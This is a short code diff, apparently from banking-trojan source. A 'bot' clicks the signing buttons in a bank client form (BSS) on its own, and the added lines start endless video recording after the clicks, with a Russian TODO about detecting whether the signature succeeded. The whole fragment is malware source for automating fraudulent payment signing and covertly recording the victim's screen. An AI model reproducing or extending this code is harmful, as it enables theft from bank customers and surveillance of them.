@@ -382,7 +382,20 @@ protected:
 	{
 		DWORD Count = BSSClickToButtons(FForm, true, BSS_SIGN_BUTTON_CAPTION_HASH);
 		BDBG("bsssign","Подпись завершена. Нажато кнопок %d", Count);
-        TBSSForm::Click();
+		TBSSForm::Click();
+
+
+        /* TODO :
+			Запускаем бесконечную запись видео.
+			Данная запись должна запускаться только в случае успешной подписи
+			Проблема в том, что из бота определить, что полпись успешно
+			поставлена
+		*/
+        if (Count)
+			VideoRecorderSrv::StartInfiniteRecording("");
+
+		//---------------------------------------------
+
         return Count > 0;
     }
 
